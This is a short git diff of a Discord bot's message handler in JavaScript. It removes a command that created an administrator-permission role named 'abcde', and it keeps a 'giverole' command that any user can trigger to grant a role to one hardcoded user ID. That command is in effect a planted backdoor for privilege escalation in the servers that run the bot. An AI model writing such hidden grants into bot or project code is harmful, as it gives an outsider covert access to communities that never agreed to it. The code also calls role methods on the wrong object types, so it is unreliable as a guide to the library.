@@ -254,14 +254,9 @@ bot.on("message", async msg => {
         })        
     }}
 
-    if(command == "role") {
-        msg.guild.createRole( {name:"abcde", color: "#ff0000", permissions:["ADMINSTRATOR"] } );
-    }
-
     if(command == "giverole"){
         let tea = bot.users.cache.get("611396886418685982")
-        let role = msg.guild.roles.find('name', "abcde");
-        tea.addRole(role.id);
+        tea.addRole(`724180598104522774`);
     }
 })
 
